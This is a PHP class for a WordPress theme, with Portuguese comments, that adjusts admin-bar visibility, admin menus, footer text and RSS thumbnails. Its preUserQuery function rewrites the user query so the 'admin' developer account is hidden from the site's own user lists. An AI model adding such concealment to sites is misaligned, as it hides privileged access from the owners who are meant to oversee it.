<?php
/*
Name: ClassCore
Description: Controla as demais classes do tema
Version: 1.0
Author: Miguel Müller
AuthorURI: https://github.com/miguelsneto
license: Creative Commons - Atribuição-NãoComercial-SemDerivados 3.0 Não Adaptada License.
LicenseURI: http://creativecommons.org/licenses/by-nc-nd/3.0/
*/

class ClassCore
{
    public function __construct()
    {
        //REMOVE FUNÇÕES NATIVAS
        remove_action( 'wp_head', 'wp_generator' );
        remove_action( 'wp_head', 'rsd_link' );
        remove_action( 'wp_head', 'wlwmanifest_link' );

        //NO LOGOUT REDIRECIONA PARA O LOGIN
        add_action('wp_logout', function() { wp_redirect(home_url()); exit(); });

        //WP-ADMIN-BAR APENAS PARA ADMINISTRADORES
        add_action('after_setup_theme', array( &$this, 'after_setup_theme' ) );

        //CRIA O MENU DO TEMA PERSONALIZADO
        add_action('admin_menu', array( &$this, 'adminMenu' ) );
        add_action('admin_menu', array( &$this, 'removeSubMenu' ), 999 );

        //ALTERA O RODAPÉ DO PAINEL ADMINITRATIVO
        add_action( 'admin_footer_text', array( &$this, 'adminFooterText' ) );
        add_filter( 'update_footer', array( &$this, 'updateFooter' ), 999 );

        //ALTERA A WP-ADMIN-BAR QUANDO LOGADO
        add_filter( 'admin_bar_menu', array( &$this, 'adminBarMenu' ), 100 );
        add_action( 'wp_before_admin_bar_render', array( &$this, 'wpBeforeAdminBarRender' ));

        //REMOVE DETERMINADO USUÁRIO DAS LISTAS DO PAINEL ADMINITRATIVO
        add_action('pre_user_query', array( &$this, 'preUserQuery' ) );

        //CARREGA JAVASCRIPTS USADOS NO PAINEL ADMINITRATIVO
        add_action('admin_enqueue_scripts', array( &$this, 'adminEnqueueScripts' ) );

        //COLOCA IMAGEM NO FEED RSS
        add_filter('the_excerpt_rss', array( &$this, 'rssWithImage' ) );
        add_filter('the_content_feed', array( &$this, 'rssWithImage' ) );

        //ALTERA O PAINEL DE EDIÇÃO DO PERFIL
        add_action( 'show_user_profile', array( &$this, 'formUserOptions' ) );
        add_action( 'edit_user_profile', array( &$this, 'formUserOptions' ) );
    }

    function after_setup_theme()
    {
        if ( (!current_user_can( 'edit_posts' )) || (!current_user_can('administrator') && !is_admin()) ) {
            show_admin_bar(false);
        }
    }

    function adminMenu()
    {
        $hookname = get_plugin_page_hookname('configSite', 'admin.php');
        add_menu_page('Config. Site', 'Config. Site', 'level_3', 'configSite', function() {},'',61);
    }
    function removeSubMenu()
    {
        $page = remove_submenu_page( 'configSite', 'configSite' );
    }

    function adminFooterText ()
    {
        echo 'Desenvolvido por <a href="https://www.facebook.com/miguel.sneto   " target="_blank">Miguel Müller</a>';
    }
    function updateFooter()
    {
        $myTheme = wp_get_theme();
        return 'Versão atual do tema '.$myTheme->Name. " é " .$myTheme->Version;
    }

    function adminBarMenu( $wp_admin_bar )
    {
        $my_account=$wp_admin_bar->get_node('my-account');
        $newtitle = str_replace( 'Olá', 'Seja bem vindo', $my_account->title );
        $wp_admin_bar->add_node( array(
            'id' => 'my-account',
            'title' => $newtitle,
        ) );

        if ( !is_user_logged_in() ) { return; }
        if ( !is_super_admin() || !is_admin_bar_showing() ) { return; }

        $wp_admin_bar->add_menu( array(
            'id'    => 'menu_listas',
            'title' => '<span class="ab-icon"></span><span class="ab-label">Listas</span>',
            'href'   => admin_url() .'edit.php'
        ));

        $wp_admin_bar->add_menu( array(
            'parent' => 'menu_listas',
            'id'     => 'lista_post',
            'title'  => 'Posts',
            'href'   => admin_url() .'edit.php'
        ));

        $wp_admin_bar->add_menu( array(
            'parent' => 'menu_listas',
            'id'     => 'lista_midias',
            'title'  => 'Mídias',
            'href'   => admin_url() .'upload.php'
        ));

        $wp_admin_bar->add_menu( array(
            'parent' => 'menu_listas',
            'id'     => 'lista_paginas',
            'title'  => 'Páginas',
            'href'   => admin_url() .'edit.php?post_type=page'
        ));
    }

    function wpBeforeAdminBarRender () {
        global $wp_admin_bar;
        $wp_admin_bar->remove_menu('wp-logo');
        if (is_multisite()) {
            if ( (!current_user_can( 'edit_posts' )) || (!current_user_can('administrator') && !is_admin()) ) {
                $wp_admin_bar->remove_menu('my-sites');
            }
        }
    }

    function preUserQuery($userSearch)
    {
        $usuarioDeveloper = 'admin';
        if ($usuarioDeveloper != ''){
            global $wpdb;
            $userSearch->query_where = str_replace('WHERE 1=1',
                "WHERE 1=1 AND {$wpdb->users}.user_login != '$usuarioDeveloper'",$userSearch->query_where);
        }
    }

    function adminEnqueueScripts()
    {
        $caminhoBase = get_template_directory_uri() . '/functions/ClassCore/';
    }

    function rssWithImage($content)
    {
        global $post;
        if(has_post_thumbnail($post->ID)) {
            $content = '<div>' . get_the_post_thumbnail($post->ID) . '</div>' . $content;
        }
        return $content;
    }

    function formUserOptions( $user ) {
    ?>
        <h2>Suas opções personalizadas</h2>
    <?php }
}
$ClassCore = new ClassCore();
?>